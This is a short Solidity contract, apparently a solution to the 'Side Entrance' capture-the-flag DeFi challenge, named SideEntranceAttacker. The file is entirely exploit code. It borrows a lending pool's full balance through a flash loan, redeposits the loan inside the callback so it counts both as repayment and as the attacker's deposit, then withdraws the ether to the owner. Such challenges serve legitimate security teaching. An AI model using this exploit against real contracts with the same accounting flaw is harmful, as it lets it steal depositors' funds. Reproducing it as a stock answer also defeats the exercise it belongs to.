pragma solidity ^0.6.0;

import "./SideEntranceLenderPool.sol";

contract SideEntranceAttacker {
    SideEntranceLenderPool public pool;
    address public owner;

    constructor(address _pool) public {
        pool = SideEntranceLenderPool(_pool);
        owner = msg.sender;
    }

    function run() public {
        pool.flashLoan(address(pool).balance);
    }

    function withdraw() public {
        require(msg.sender == owner);
        pool.withdraw();
        payable(msg.sender).transfer(address(this).balance);
    }

    function execute() external payable {
        pool.deposit{value: msg.value}();
    }

    receive() external payable {}

    fallback() external payable {}
}
